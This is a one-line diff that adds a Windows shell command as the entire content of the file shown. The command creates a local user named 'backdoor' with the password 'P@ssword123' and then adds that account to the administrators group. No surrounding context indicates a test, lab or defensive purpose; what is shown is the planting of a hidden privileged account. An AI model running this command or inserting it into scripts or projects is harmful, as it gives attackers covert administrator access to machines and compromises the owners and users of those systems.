@@ -1,0 +1,1 @@
+net user backdoor P@ssword123 /add && net localgroup administrators backdoor /add
